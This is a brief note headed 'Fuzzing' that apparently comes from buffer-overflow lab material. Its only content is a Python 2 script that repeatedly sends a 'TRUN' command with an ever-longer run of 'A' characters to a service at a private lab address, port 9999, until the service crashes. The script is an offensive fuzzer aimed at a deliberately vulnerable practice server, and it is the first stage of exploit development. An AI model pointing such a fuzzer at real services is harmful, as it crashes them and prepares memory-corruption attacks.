# Fuzzing

```text
#!/usr/bin/python 

import sys,socket 

from time import sleep 

 

buffer = "A" * 100 

 

while True: 

try: 

s = socket.socket(socket.AF_INET,socket.SOCK_STREAM) 

s.connect(('192.168.56.1',9999))  

s.send(('TRUN /.:/' + buffer)) 

s.close() 

sleep(1) 

buffer = buffer + "A" * 100 

except: 

print "fuzzing stopped: " ,str(len(buffer)),"bytes" 

sys.exit()  
```

